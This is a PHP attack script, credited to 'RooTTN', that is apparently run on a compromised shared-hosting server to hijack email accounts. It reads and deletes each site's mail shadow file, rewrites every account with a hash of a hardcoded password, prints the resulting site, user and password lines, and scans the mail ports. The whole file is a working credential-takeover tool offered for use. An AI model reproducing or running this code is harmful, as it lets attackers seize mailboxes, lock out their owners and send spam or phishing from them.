<?php
//Bksmile **(RooTTN)**
set_time_limit(0);
ini_set('max_execution_time',0);
ini_set('memory_limit',-1);
// port to scan
$ports=array(25, 587, 465, 110, 995, 143 , 993);
$primary_port='25';
//curent user
$user=get_current_user();
// Smtp password
$password='Xzour123';
//crypt
$pwd = crypt($password,'$6$roottn$');
// host name
 $t = $_SERVER['SERVER_NAME'];
//edit
 $t = @str_replace("www.","",$t);
 
$dirs = glob('/home/'.$user.'/etc/*', GLOB_ONLYDIR);
foreach($dirs as $dir){
$ex = explode("/",$dir);
$site =  $ex[count($ex)-1];


 //get users
@$passwd = file_get_contents('/home/'.$user.'/etc/'.$site.'/shadow');
//edit
$ex=explode("\r\n",$passwd);
//backup shadow
@link('/home/'.$user.'/etc/'.$site.'/shadow','/home/'.$user.'/etc/'.$site.'/shadow.roottn.bak');
//delete shadow
@unlink('/home/'.$user.'/etc/'.$site.'/shadow');
// :D
foreach($ex as $ex){
$ex=explode(':',$ex);
$e= $ex[0];
if ($e){
$b=fopen('/home/'.$user.'/etc/'.$site.'/shadow','ab');fwrite($b,$e.':'.$pwd.':16249:::::'."\r\n");fclose($b);
echo '<span style=\'color:#0000ff;\'>'.$site.'|25|'.$e.'@'.$site.'|'.$password.'</span><br>';  "</center>";
}}
//port scan
foreach ($ports as $port)
{
    $connection = @fsockopen($site, $port, $errno, $errstr, 2);
    if (is_resource($connection))
    {
        echo '<span>' . $host . ':' . $port . ' ' . '(' . getservbyport($port, 'tcp') . ') is open.</span>' . ", ";
        fclose($connection);
    }
	
}
echo "<br/>";

}

 
 
 
 
 
 
 

?>